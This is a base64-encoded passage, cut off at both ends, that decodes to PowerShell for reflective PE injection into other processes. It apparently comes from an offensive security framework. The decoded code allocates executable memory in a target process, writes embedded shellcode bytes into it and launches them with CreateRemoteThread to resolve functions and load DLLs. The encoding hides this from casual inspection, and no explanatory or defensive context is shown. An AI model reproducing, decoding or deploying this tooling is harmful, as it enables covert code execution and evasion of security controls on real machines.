JuVmFsTWVtID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRQdHJTaXplKQogICAgICAgICAgICAkUmVzdWx0ID0gJFdpbjMyRnVuY3Rpb25zLlJlYWRQcm9jZXNzTWVtb3J5Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgJExvYWRMaWJyYXJ5QVJldE1lbSwgJFJldHVyblZhbE1lbSwgW1VJbnRQdHJdW1VJbnQ2NF0kUHRyU2l6ZSwgW1JlZl0kTnVtQnl0ZXNXcml0dGVuKQogICAgICAgICAgICBpZiAoJFJlc3VsdCAtZXEgJGZhbHNlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBUaHJvdyAiQ2FsbCB0byBSZWFkUHJvY2Vzc01lbW9yeSBmYWlsZWQiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgW0ludFB0cl0kRGxsQWRkcmVzcyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRSZXR1cm5WYWxNZW0sIFtUeXBlXVtJbnRQdHJdKQoKICAgICAgICAgICAgJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxGcmVlRXguSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCAkTG9hZExpYnJhcnlBUmV0TWVtLCBbVUludFB0cl1bVUludDY0XTAsICRXaW4zMkNvbnN0YW50cy5NRU1fUkVMRUFTRSkgfCBPdXQtTnVsbAogICAgICAgICAgICAkV2luMzJGdW5jdGlvbnMuVmlydHVhbEZyZWVFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRSU0NBZGRyLCBbVUludFB0cl1bVUludDY0XTAsICRXaW4zMkNvbnN0YW50cy5NRU1fUkVMRUFTRSkgfCBPdXQtTnVsbAogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBbSW50UHRyXSRSVGhyZWFkSGFuZGxlID0gQ3JlYXRlLVJlbW90ZVRocmVhZCAtUHJvY2Vzc0hhbmRsZSAkUmVtb3RlUHJvY0hhbmRsZSAtU3RhcnRBZGRyZXNzICRMb2FkTGlicmFyeUFBZGRyIC1Bcmd1bWVudFB0ciAkUkltcG9ydERsbFBhdGhQdHIgLVdpbjMyRnVuY3Rpb25zICRXaW4zMkZ1bmN0aW9ucwogICAgICAgICAgICAkUmVzdWx0ID0gJFdpbjMyRnVuY3Rpb25zLldhaXRGb3JTaW5nbGVPYmplY3QuSW52b2tlKCRSVGhyZWFkSGFuZGxlLCAyMDAwMCkKICAgICAgICAgICAgaWYgKCRSZXN1bHQgLW5lIDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICJDYWxsIHRvIENyZWF0ZVJlbW90ZVRocmVhZCB0byBjYWxsIEdldFByb2NBZGRyZXNzIGZhaWxlZC4iCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIFtJbnQzMl0kRXhpdENvZGUgPSAwCiAgICAgICAgICAgICRSZXN1bHQgPSAkV2luMzJGdW5jdGlvbnMuR2V0RXhpdENvZGVUaHJlYWQuSW52b2tlKCRSVGhyZWFkSGFuZGxlLCBbUmVmXSRFeGl0Q29kZSkKICAgICAgICAgICAgaWYgKCgkUmVzdWx0IC1lcSAwKSAtb3IgKCRFeGl0Q29kZSAtZXEgMCkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICJDYWxsIHRvIEdldEV4aXRDb2RlVGhyZWFkIGZhaWxlZCIKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgW0ludFB0cl0kRGxsQWRkcmVzcyA9IFtJbnRQdHJdJEV4aXRDb2RlCiAgICAgICAgfQogICAgICAgIAogICAgICAgICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsRnJlZUV4Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgJFJJbXBvcnREbGxQYXRoUHRyLCBbVUludFB0cl1bVUludDY0XTAsICRXaW4zMkNvbnN0YW50cy5NRU1fUkVMRUFTRSkgfCBPdXQtTnVsbAogICAgICAgIAogICAgICAgIHJldHVybiAkRGxsQWRkcmVzcwogICAgfQogICAgCiAgICAKICAgIEZ1bmN0aW9uIEdldC1SZW1vdGVQcm9jQWRkcmVzcwogICAgewogICAgICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb249MCwgTWFuZGF0b3J5PSR0cnVlKV0KICAgICAgICBbSW50UHRyXQogICAgICAgICRSZW1vdGVQcm9jSGFuZGxlLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb249MSwgTWFuZGF0b3J5PSR0cnVlKV0KICAgICAgICBbSW50UHRyXQogICAgICAgICRSZW1vdGVEbGxIYW5kbGUsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbj0yLCBNYW5kYXRvcnk9JHRydWUpXQogICAgICAgIFtJbnRQdHJdCiAgICAgICAgJEZ1bmN0aW9uTmFtZVB0ciwjVGhpcyBjYW4gZWl0aGVyIGJlIGEgcHRyIHRvIGEgc3RyaW5nIHdoaWNoIGlzIHRoZSBmdW5jdGlvbiBuYW1lLCBvciwgaWYgTG9hZEJ5T3JkaW5hbCBpcyAndHJ1ZScgdGhpcyBpcyBhbiBvcmRpbmFsIG51bWJlciAocG9pbnRzIHRvIG5vdGhpbmcpCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb249MywgTWFuZGF0b3J5PSR0cnVlKV0KICAgICAgICBbQm9vbF0KICAgICAgICAkTG9hZEJ5T3JkaW5hbAogICAgICAgICkKCiAgICAgICAgJFB0clNpemUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdW0ludFB0cl0pCgogICAgICAgIFtJbnRQdHJdJFJGdW5jTmFtZVB0ciA9IFtJbnRQdHJdOjpaZXJvICAgI1BvaW50ZXIgdG8gdGhlIGZ1bmN0aW9uIG5hbWUgaW4gcmVtb3RlIHByb2Nlc3MgbWVtb3J5IGlmIGxvYWRpbmcgYnkgZnVuY3Rpb24gbmFtZSwgb3JkaW5hbCBudW1iZXIgaWYgbG9hZGluZyBieSBvcmRpbmFsCiAgICAgICAgI0lmIG5vdCBsb2FkaW5nIGJ5IG9yZGluYWwsIHdyaXRlIHRoZSBmdW5jdGlvbiBuYW1lIHRvIHRoZSByZW1vdGUgcHJvY2VzcyBtZW1vcnkKICAgICAgICBpZiAoLW5vdCAkTG9hZEJ5T3JkaW5hbCkKICAgICAgICB7CiAgICAgICAgICAgICRGdW5jdGlvbk5hbWUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cmluZ0Fuc2koJEZ1bmN0aW9uTmFtZVB0cikKCiAgICAgICAgICAgICNXcml0ZSBGdW5jdGlvbk5hbWUgdG8gbWVtb3J5ICh3aWxsIGJlIHVzZWQgaW4gR2V0UHJvY0FkZHJlc3MpCiAgICAgICAgICAgICRGdW5jdGlvbk5hbWVTaXplID0gW1VJbnRQdHJdW1VJbnQ2NF0oW1VJbnQ2NF0kRnVuY3Rpb25OYW1lLkxlbmd0aCArIDEpCiAgICAgICAgICAgICRSRnVuY05hbWVQdHIgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbEFsbG9jRXguSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCBbSW50UHRyXTo6WmVybywgJEZ1bmN0aW9uTmFtZVNpemUsICRXaW4zMkNvbnN0YW50cy5NRU1fQ09NTUlUIC1ib3IgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRVNFUlZFLCAkV2luMzJDb25zdGFudHMuUEFHRV9SRUFEV1JJVEUpCiAgICAgICAgICAgIGlmICgkUkZ1bmNOYW1lUHRyIC1lcSBbSW50UHRyXTo6WmVybykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSBtZW1vcnkgaW4gdGhlIHJlbW90ZSBwcm9jZXNzIgogICAgICAgICAgICB9CgogICAgICAgICAgICBbVUludFB0cl0kTnVtQnl0ZXNXcml0dGVuID0gW1VJbnRQdHJdOjpaZXJvCiAgICAgICAgICAgICRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLldyaXRlUHJvY2Vzc01lbW9yeS5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRSRnVuY05hbWVQdHIsICRGdW5jdGlvbk5hbWVQdHIsICRGdW5jdGlvbk5hbWVTaXplLCBbUmVmXSROdW1CeXRlc1dyaXR0ZW4pCiAgICAgICAgICAgIGlmICgkU3VjY2VzcyAtZXEgJGZhbHNlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIHdyaXRlIERMTCBwYXRoIHRvIHJlbW90ZSBwcm9jZXNzIG1lbW9yeSIKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJEZ1bmN0aW9uTmFtZVNpemUgLW5lICROdW1CeXRlc1dyaXR0ZW4pCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICJEaWRuJ3Qgd3JpdGUgdGhlIGV4cGVjdGVkIGFtb3VudCBvZiBieXRlcyB3aGVuIHdyaXRpbmcgYSBETEwgcGF0aCB0byBsb2FkIHRvIHRoZSByZW1vdGUgcHJvY2VzcyIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAjSWYgbG9hZGluZyBieSBvcmRpbmFsLCBqdXN0IHNldCBSRnVuY05hbWVQdHIgdG8gYmUgdGhlIG9yZGluYWwgbnVtYmVyCiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgJFJGdW5jTmFtZVB0ciA9ICRGdW5jdGlvbk5hbWVQdHIKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgI0dldCBhZGRyZXNzIG9mIEdldFByb2NBZGRyZXNzCiAgICAgICAgJEtlcm5lbDMySGFuZGxlID0gJFdpbjMyRnVuY3Rpb25zLkdldE1vZHVsZUhhbmRsZS5JbnZva2UoImtlcm5lbDMyLmRsbCIpCiAgICAgICAgJEdldFByb2NBZGRyZXNzQWRkciA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRQcm9jQWRkcmVzcy5JbnZva2UoJEtlcm5lbDMySGFuZGxlLCAiR2V0UHJvY0FkZHJlc3MiKSAjS2VybmVsMzIgbG9hZGVkIHRvIHRoZSBzYW1lIGFkZHJlc3MgZm9yIGFsbCBwcm9jZXNzZXMKCiAgICAgICAgCiAgICAgICAgI0FsbG9jYXRlIG1lbW9yeSBmb3IgdGhlIGFkZHJlc3MgcmV0dXJuZWQgYnkgR2V0UHJvY0FkZHJlc3MKICAgICAgICAkR2V0UHJvY0FkZHJlc3NSZXRNZW0gPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbEFsbG9jRXguSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCBbSW50UHRyXTo6WmVybywgW1VJbnQ2NF1bVUludDY0XSRQdHJTaXplLCAkV2luMzJDb25zdGFudHMuTUVNX0NPTU1JVCAtYm9yICRXaW4zMkNvbnN0YW50cy5NRU1fUkVTRVJWRSwgJFdpbjMyQ29uc3RhbnRzLlBBR0VfUkVBRFdSSVRFKQogICAgICAgIGlmICgkR2V0UHJvY0FkZHJlc3NSZXRNZW0gLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSBtZW1vcnkgaW4gdGhlIHJlbW90ZSBwcm9jZXNzIGZvciB0aGUgcmV0dXJuIHZhbHVlIG9mIEdldFByb2NBZGRyZXNzIgogICAgICAgIH0KICAgICAgICAKICAgICAgICAKICAgICAgICAjV3JpdGUgU2hlbGxjb2RlIHRvIHRoZSByZW1vdGUgcHJvY2VzcyB3aGljaCB3aWxsIGNhbGwgR2V0UHJvY0FkZHJlc3MKICAgICAgICAjU2hlbGxjb2RlOiBHZXRQcm9jQWRkcmVzcy5hc20KICAgICAgICBbQnl0ZVtdXSRHZXRQcm9jQWRkcmVzc1NDID0gQCgpCiAgICAgICAgaWYgKCRQRUluZm8uUEU2NEJpdCAtZXEgJHRydWUpCiAgICAgICAgewogICAgICAgICAgICAkR2V0UHJvY0FkZHJlc3NTQzEgPSBAKDB4NTMsIDB4NDgsIDB4ODksIDB4ZTMsIDB4NDgsIDB4ODMsIDB4ZWMsIDB4MjAsIDB4NjYsIDB4ODMsIDB4ZTQsIDB4YzAsIDB4NDgsIDB4YjkpCiAgICAgICAgICAgICRHZXRQcm9jQWRkcmVzc1NDMiA9IEAoMHg0OCwgMHhiYSkKICAgICAgICAgICAgJEdldFByb2NBZGRyZXNzU0MzID0gQCgweDQ4LCAweGI4KQogICAgICAgICAgICAkR2V0UHJvY0FkZHJlc3NTQzQgPSBAKDB4ZmYsIDB4ZDAsIDB4NDgsIDB4YjkpCiAgICAgICAgICAgICRHZXRQcm9jQWRkcmVzc1NDNSA9IEAoMHg0OCwgMHg4OSwgMHgwMSwgMHg0OCwgMHg4OSwgMHhkYywgMHg1YiwgMHhjMykKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgJEdldFByb2NBZGRyZXNzU0MxID0gQCgweDUzLCAweDg5LCAweGUzLCAweDgzLCAweGU0LCAweGMwLCAweGI4KQogICAgICAgICAgICAkR2V0UHJvY0FkZHJlc3NTQzIgPSBAKDB4YjkpCiAgICAgICAgICAgICRHZXRQcm9jQWRkcmVzc1NDMyA9IEAoMHg1MSwgMHg1MCwgMHhiOCkKICAgICAgICAgICAgJEdldFByb2NBZGRyZXNzU0M0ID0gQCgweGZmLCAweGQwLCAweGI5KQogICAgICAgICAgICAkR2V0UHJvY0FkZHJlc3NTQzUgPSBAKDB4ODksIDB4MDEsIDB4ODksIDB4ZGMsIDB4NWIsIDB4YzMpCiAgICAgICAgfQogICAgICAgICRTQ0xlbmd0aCA9ICRHZXRQcm9jQWRkcmVzc1NDMS5MZW5ndGggKyAkR2V0UHJvY0FkZHJlc3NTQzIuTGVuZ3RoICsgJEdldFByb2NBZGRyZXNzU0MzLkxlbmd0aCArICRHZXRQcm9jQWRkcmVzc1NDNC5MZW5ndGggKyAkR2V0UHJvY0FkZHJlc3NTQzUuTGVuZ3RoICsgKCRQdHJTaXplICogNCkKICAgICAgICAkU0NQU01lbSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkU0NMZW5ndGgpCiAgICAgICAgJFNDUFNNZW1PcmlnaW5hbCA9ICRTQ1BTTWVtCiAgICAgICAgCiAgICAgICAgV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJEdldFByb2NBZGRyZXNzU0MxIC1NZW1vcnlBZGRyZXNzICRTQ1BTTWVtCiAgICAgICAgJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJEdldFByb2NBZGRyZXNzU0MxLkxlbmd0aCkKICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkUmVtb3RlRGxsSGFuZGxlLCAkU0NQU01lbSwgJGZhbHNlKQogICAgICAgICRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRQdHJTaXplKQogICAgICAgIFdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRHZXRQcm9jQWRkcmVzc1NDMiAtTWVtb3J5QWRkcmVzcyAkU0NQU01lbQogICAgICAgICRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRHZXRQcm9jQWRkcmVzc1NDMi5MZW5ndGgpCiAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJFJGdW5jTmFtZVB0ciwgJFNDUFNNZW0sICRmYWxzZSkKICAgICAgICAkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkUHRyU2l6ZSkKICAgICAgICBXcml0ZS1CeXRlc1RvTWVtb3J5IC1CeXRlcyAkR2V0UHJvY0FkZHJlc3NTQzMgLU1lbW9yeUFkZHJlc3MgJFNDUFNNZW0KICAgICAgICAkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkR2V0UHJvY0FkZHJlc3NTQzMuTGVuZ3RoKQogICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCRHZXRQcm9jQWRkcmVzc0FkZHIsICRTQ1BTTWVtLCAkZmFsc2UpCiAgICAgICAgJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJFB0clNpemUpCiAgICAgICAgV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJEdldFByb2NBZGRyZXNzU0M0IC1NZW1vcnlBZGRyZXNzICRTQ1BTTWVtCiAgICAgICAgJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJEdldFByb2NBZGRyZXNzU0M0Lkxlbmd0aCkKICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkR2V0UHJvY0FkZHJlc3NSZXRNZW0sICRTQ1BTTWVtLCAkZmFsc2UpCiAgICAgICAgJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJFB0clNpemUpCiAgICAgICAgV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJEdldFByb2NBZGRyZXNzU0M1IC1NZW1vcnlBZGRyZXNzICRTQ1BTTWVtCiAgICAgICAgJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJEdldFByb2NBZGRyZXNzU0M1Lkxlbmd0aCkKICAgICAgICAKICAgICAgICAkUlNDQWRkciA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsQWxsb2NFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsIFtJbnRQdHJdOjpaZXJvLCBbVUludFB0cl1bVUludDY0XSRTQ0xlbmd0aCwgJFdpbjMyQ29uc3RhbnRzLk1FTV9DT01NSVQgLWJvciAkV2luMzJDb25zdGFudHMuTUVNX1JFU0VSVkUsICRXaW4zMkNvbnN0YW50cy5QQUdFX0VYRUNVVEVfUkVBRFdSSVRFKQogICAgICAgIGlmICgkUlNDQWRkciAtZXEgW0ludFB0cl06Olplcm8pCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGFsbG9jYXRlIG1lbW9yeSBpbiB0aGUgcmVtb3RlIHByb2Nlc3MgZm9yIHNoZWxsY29kZSIKICAgICAgICB9CiAgICAgICAgW1VJbnRQdHJdJE51bUJ5dGVzV3JpdHRlbiA9IFtVSW50UHRyXTo6WmVybwogICAgICAgICRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLldyaXRlUHJvY2Vzc01lbW9yeS5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRSU0NBZGRyLCAkU0NQU01lbU9yaWdpbmFsLCBbVUludFB0cl1bVUludDY0XSRTQ0xlbmd0aCwgW1JlZl0kTnVtQnl0ZXNXcml0dGVuKQogICAgICAgIGlmICgoJFN1Y2Nlc3MgLWVxICRmYWxzZSkgLW9yIChbVUludDY0XSROdW1CeXRlc1dyaXR0ZW4gLW5lIFtVSW50NjRdJFNDTGVuZ3RoKSkKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gd3JpdGUgc2hlbGxjb2RlIHRvIHJlbW90ZSBwcm9jZXNzIG1lbW9yeS4iCiAgICAgICAgfQogICAgICAgIAogICAgICAgICRSVGhyZWFkSGFuZGxlID0gQ3JlYXRlLVJlbW90ZVRocmVhZCAtUHJvY2Vzc0hhbmRsZSAkUmVtb3RlUHJvY0hhbmRsZSAtU3RhcnRBZGRyZXNzICRSU0NBZGRyIC1XaW4zMkZ1bmN0aW9ucyAkV2luMzJGdW5jdGlvbnMKICAgICAgICAkUmVzdWx0ID0gJFdpbjMyRnVuY3Rpb25zLldhaXRGb3JTaW5nbGVPYmplY3QuSW52b2tlKCRSVGhyZWFkSGFuZGxlLCAyMDAwMCkKICAgICAgICBpZiAoJFJlc3VsdCAtbmUgMCkKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJDYWxsIHRvIENyZWF0ZVJlbW90ZVRocmVhZCB0byBjYWxsIEdldFByb2NBZGRyZXNzIGZhaWxlZC4iCiAgICAgICAgfQogICAgICAgIAogICAgICAgICNUaGUgcHJvY2VzcyBhZGRyZXNzIGlzIHdyaXR0ZW4gdG8gbWVtb3J5IGluIHRoZSByZW1vdGUgcHJvY2VzcyBhdCBhZGRyZXNzICRHZXRQcm9jQWRkcmVzc1JldE1lbSwgcmVhZCB0aGlzIG1lbW9yeQogICAgICAgIFtJbnRQdHJdJFJldHVyblZhbE1lbSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkUHRyU2l6ZSkKICAgICAgICAkUmVzdWx0ID0gJFdpbjMyRnVuY3Rpb25zLlJlYWRQcm9jZXNzTWVtb3J5Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgJEdldFByb2NBZGRyZXNzUmV0TWVtLCAkUmV0dXJuVmFsTWVtLCBbVUludFB0cl1bVUludDY0XSRQdHJTaXplLCBbUmVmXSROdW1CeXRlc1dyaXR0ZW4pCiAgICAgICAgaWYgKCgkUmVzdWx0IC1lcSAkZmFsc2UpIC1vciAoJE51bUJ5dGVzV3JpdHRlbiAtZXEgMCkpCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiQ2FsbCB0byBSZWFkUHJvY2Vzc01lbW9yeSBmYWlsZWQiCiAgICAgICAgfQogICAgICAgIFtJbnRQdHJdJFByb2NBZGRyZXNzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJFJldHVyblZhbE1lbSwgW1R5cGVdW0ludFB0cl0pCgogICAgICAgICNDbGVhbnVwIHJlbW90ZSBwcm9jZXNzIG1lbW9yeQogICAgICAgICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsRnJlZUV4Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgJFJTQ0FkZHIsIFtVSW50UHRyXVtVSW50NjRdMCwgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRUxFQVNFKSB8IE91dC1OdWxsCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxGcmVlRXguSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCAkR2V0UHJvY0FkZHJlc3NSZXRNZW0sIFtVSW50UHRyXVtVSW50NjRdMCwgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRUxFQVNFKSB8IE91dC1OdWxsCgogICAgICAgIGlmICgtbm90ICRMb2FkQnlPcmRpbmFsKQogICAgICAgIHsKICAgICAgICAgICAgJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxGcmVlRXguSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCAkUkZ1bmNOYW1lUHRyLCBbVUludFB0cl1bVUludDY0XTAsICRXaW4zMkNvbnN0YW50cy5NRU1fUkVMRUFTRSkgfCBPdXQtTnVsbAogICAgICAgIH0KICAgICAgICAKICAgICAgICByZXR1cm4gJFByb2NBZGRyZXNzCiAgICB9CgoKICAgIEZ1bmN0aW9uIENvcHktU2VjdGlvbnMKICAgIHsKICAgICAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtCeXRlW11dCiAgICAgICAgJFBFQnl0ZXMsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3lzdGVtLk9iamVjdF0KICAgICAgICAkUEVJbmZvLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1N5c3RlbS5PYmplY3RdCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1N5c3RlbS5PYmplY3RdCiAgICAgICAgJFdpbjMyVHlwZXMKICAgICAgICApCiAgICAgICAgCiAgICAgICAgZm9yKCAkaSA9IDA7ICRpIC1sdCAkUEVJbmZvLklNQUdFX05UX0hFQURFUlMuRmlsZUhlYWRlci5OdW1iZXJPZlNlY3Rpb25zOyAkaSsrKQogICAgICAgIHsKICAgICAgICAgICAgW0ludFB0cl0kU2VjdGlvbkhlYWRlclB0ciA9IFtJbnRQdHJdKEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJFBFSW5mby5TZWN0aW9uSGVhZGVyUHRyKSAoJGkgKiBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdJFdpbjMyVHlwZXMuSU1BR0VfU0VDVElPTl9IRUFERVIpKSkKICAgICAgICAgICAgJFNlY3Rpb25IZWFkZXIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkU2VjdGlvbkhlYWRlclB0ciwgW1R5cGVdJFdpbjMyVHlwZXMuSU1BR0VfU0VDVElPTl9IRUFERVIpCiAgICAgICAgCiAgICAgICAgICAgICNBZGRyZXNzIHRvIGNvcHkgdGhlIHNlY3Rpb24gdG8KICAgICAgICAgICAgW0ludFB0cl0kU2VjdGlvbkRlc3RBZGRyID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kUEVJbmZvLlBFSGFuZGxlKSAoW0ludDY0XSRTZWN0aW9uSGVhZGVyLlZpcnR1YWxBZGRyZXNzKSkKICAgICAgICAgICAgCiAgICAgICAgICAgICNTaXplT2ZSYXdEYXRhIGlzIHRoZSBzaXplIG9mIHRoZSBkYXRhIG9uIGRpc2ssIFZpcnR1YWxTaXplIGlzIHRoZSBtaW5pbXVtIHNwYWNlIHRoYXQgY2FuIGJlIGFsbG9jYXRlZAogICAgICAgICAgICAjICAgIGluIG1lbW9yeSBmb3IgdGhlIHNlY3Rpb24uIElmIFZpcnR1YWxTaXplID4gU2l6ZU9mUmF3RGF0YSwgcGFkIHRoZSBleHRyYSBzcGFjZXMgd2l0aCAwLiBJZgogICAgICAgICAgICAjICAgIFNpemVPZlJhd0RhdGEgPiBWaXJ0dWFsU2l6ZSwgaXQgaXMgYmVjYXVzZSB0aGUgc2VjdGlvbiBzdG9yZWQgb24gZGlzayBoYXMgcGFkZGluZyB0aGF0IHdlIGNhbiB0aHJvdyBhd2F5LAogICAgICAgICAgICAjICAgIHNvIHRydW5jYXRlIFNpemVPZlJhd0RhdGEgdG8gVmlydHVhbFNpemUKICAgICAgICAgICAgJFNpemVPZlJhd0RhdGEgPSAkU2VjdGlvbkhlYWRlci5TaXplT2ZSYXdEYXRhCgogICAgICAgICAgICBpZiAoJFNlY3Rpb25IZWFkZXIuUG9pbnRlclRvUmF3RGF0YSAtZXEgMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFNpemVPZlJhd0RhdGEgPSAwCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIGlmICgkU2l6ZU9mUmF3RGF0YSAtZ3QgJFNlY3Rpb25IZWFkZXIuVmlydHVhbFNpemUpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRTaXplT2ZSYXdEYXRhID0gJFNlY3Rpb25IZWFkZXIuVmlydHVhbFNpemUKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgKCRTaXplT2ZSYXdEYXRhIC1ndCAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBUZXN0LU1lbW9yeVJhbmdlVmFsaWQgLURlYnVnU3RyaW5nICJDb3B5LVNlY3Rpb25zOjpNYXJzaGFsQ29weSIgLVBFSW5mbyAkUEVJbmZvIC1TdGFydEFkZHJlc3MgJFNlY3Rpb25EZXN0QWRkciAtU2l6ZSAkU2l6ZU9mUmF3RGF0YSB8IE91dC1OdWxsCiAgICAgICAgICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRQRUJ5dGVzLCBbSW50M